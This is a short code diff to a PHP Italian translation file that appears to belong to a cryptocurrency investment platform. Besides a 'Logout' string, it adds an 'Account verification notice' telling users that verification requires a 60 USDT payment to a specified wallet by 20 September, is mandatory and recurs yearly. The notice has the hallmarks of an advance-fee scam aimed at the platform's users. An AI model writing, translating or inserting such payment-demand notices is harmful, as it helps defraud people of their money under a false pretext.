@@ -115,4 +115,16 @@ return [
     'Investment' => 'Investimento',
     'Wallet Address' => 'Indirizzo del portafoglio',
     'Virtual' => 'Virtuale',
+    'Logout' => 'Esci',
+    'Account verification notice' => <<<'TEXT'
+Cari partner!
+
+Per il corretto funzionamento della piattaforma e la capacità di elaborare tutti i pagamenti e i rimborsi, è importante avere dati utente accurati e aggiornati.
+
+A questo proposito, è necessario completare la procedura di verifica dell'account. Richiede un pagamento di 60 USDT al portafoglio qui specificato, dopodiché il tuo account verrà attivato e il sistema riceverà i dati necessari per l'elaborazione corretta dei pagamenti.
+
+Questi fondi sono diretti a supportare il funzionamento stabile del sito e dell'identificazione dell'utente, garantendo la protezione degli account e mantenendoli aggiornati.
+
+Il pagamento deve essere effettuato entro il 20 settembre. Questa procedura è obbligatoria e viene addebitata ogni anno.
+TEXT,
 ];
